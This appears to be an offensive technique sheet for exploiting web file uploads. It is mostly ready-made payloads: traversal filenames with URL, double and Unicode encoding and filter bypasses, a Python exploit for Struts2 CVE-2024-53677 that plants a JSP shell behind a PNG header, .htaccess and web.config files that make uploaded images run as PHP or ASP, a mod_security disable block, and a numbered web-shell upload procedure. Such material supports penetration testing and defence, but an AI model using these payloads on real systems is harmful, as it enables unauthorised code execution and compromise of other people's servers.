# File Upload — Path Traversal + .htaccess / web.config

## When this applies

- Filename in `Content-Disposition` is concatenated into the destination path.
- Server allows `.htaccess` (Apache) or `web.config` (IIS) uploads.
- Goal: write outside the upload directory OR change the directory's content-type handler so other uploads execute.

## Technique

Inject `..` into the filename, OR upload `.htaccess` first to enable PHP execution for innocent extensions, then upload `shell.jpg` carrying PHP code.

## Steps

### Path traversal in filename

```
../exploit.php
../../exploit.php
../../../exploit.php
..\/exploit.php
..\exploit.php
```

### URL-encoded traversal

```
..%2fexploit.php
..%2f..%2fexploit.php
..%5cexploit.php
%2e%2e%2fexploit.php
%2e%2e%5cexploit.php
```

### Double URL-encoding

```
..%252fexploit.php
%252e%252e%252fexploit.php
```

### Unicode encoding

```
..%c0%afexploit.php
..%c1%9cexploit.php
..%c0%2fexploit.php
```

### Absolute path upload

```
/var/www/html/exploit.php
C:\inetpub\wwwroot\exploit.php
/usr/share/nginx/html/exploit.php
```

### Modifying Content-Disposition

```http
# Original
Content-Disposition: form-data; name="avatar"; filename="exploit.php"

# Path traversal attempts
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Disposition: form-data; name="avatar"; filename="../../web/exploit.php"
Content-Disposition: form-data; name="avatar"; filename="..%2f..%2fexploit.php"
```

### Bypass traversal filters

```
# If ../ is stripped
....//exploit.php  (becomes ../ after strip)
..././exploit.php

# If both ../ and ..\ are stripped
..;/exploit.php
..\/exploit.php (mixed separators)
```

### Framework param re-binding (Struts2 OGNL → CVE-2024-53677)

When a framework binds an upload's resolved filename to an action property AFTER the file-upload interceptor has already set it, the destination filename can be hijacked by sending an extra OGNL parameter that re-sets the same property.

**Detection signals**: URLs ending in `.action`/`.do`, `JSESSIONID` cookie, form `enctype="multipart/form-data"` posting to a Java servlet container, `/struts/`/`/dispatcher` traces, X-Powered-By Servlet/JSP banner.

**Exploit shape (Apache Struts 2 < 6.4.0)**:
```python
files = {
    'Upload': ('exploit.png', shell_bytes, 'image/png'),     # capital U
    'top.UploadFileName': (None, '../../shell.jsp'),         # traversal target
}
requests.post(target, files=files, headers={'Host': vhost})
```

The file body must still pass any magic-byte / Content-Type check the action performs — prepend a real PNG header (`\x89PNG\r\n\x1a\n`) to your JSP and use `Content-Type: image/png`. Tomcat happily executes `.jsp` regardless of the file's leading bytes once Struts writes it through the traversal to `webapps/ROOT/<name>.jsp`.

**Why two-part / both spellings**: the Struts FileUploadInterceptor binds `uploadFileName` from the multipart filename first; then the OGNL `params` interceptor re-binds the same property from a literal form parameter named `top.UploadFileName`. Last-writer-wins → the action's `new File(timeDir, uploadFileName)` resolves with traversal.

**Same primitive elsewhere**: any framework that exposes its action object graph to params after the upload interceptor — Spring MVC `@ModelAttribute`, Stripes, custom Servlet binders.

**Bait-config trap**: when the same app exposes a `/download.action` returning the deployment ZIP/source, the bundled `tomcat-users.xml` / `application.properties` / `.env` often contain SAMPLE credentials that don't match the running host. Always re-read the on-disk configs after RCE.

### .htaccess — basic upload

```apache
# Enable PHP execution for custom extension
AddType application/x-httpd-php .l33t
AddType application/x-httpd-php .shell
AddType application/x-httpd-php .pwn
AddType application/x-httpd-php .hacker

# Multiple extensions
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .pdf

# AddHandler instead
AddHandler application/x-httpd-php .jpg
SetHandler application/x-httpd-php
```

### .htaccess — advanced

```apache
# Execute all files as PHP
SetHandler application/x-httpd-php

# Override file type restrictions
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>

# Disable security modules
<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
</IfModule>

# Alternative handlers
AddHandler cgi-script .jpg
Options +ExecCGI
AddType application/x-httpd-php .jpg

# PHP configuration override
php_value auto_prepend_file /var/www/uploads/shell.jpg
```

### .htaccess upload procedure

```
1. Create .htaccess file with:
   AddType application/x-httpd-php .jpg

2. Upload .htaccess to target directory

3. Upload shell.jpg containing PHP code

4. Access /uploads/shell.jpg

5. Server executes PHP despite .jpg extension
```

### IIS web.config — PHP execution

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI"
                 path="*.jpg"
                 verb="*"
                 modules="FastCgiModule"
                 scriptProcessor="C:\PHP\php-cgi.exe"
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

### IIS web.config — ASP handler

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="JPG_Handler"
                 path="*.jpg"
                 verb="GET,HEAD,POST"
                 modules="IsapiModule"
                 scriptProcessor="%windir%\system32\inetsrv\asp.dll"
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

## Verifying success

- File appears at the traversed path (verify by direct GET).
- After `.htaccess` upload, `.jpg` files execute as PHP.
- Access logs / error logs reveal the actual write location.

## Common pitfalls

- Modern Apache may have `AllowOverride None` — `.htaccess` upload is ineffective.
- `web.config` requires app pool restart on some IIS configurations.
- Path traversal may be stripped by the framework before reaching the disk write — try filter-bypass payloads.

## Tools

- Burp Suite Repeater (modify Content-Disposition)
- ffuf with traversal wordlists
- requests / multipart_form library (programmatic upload)
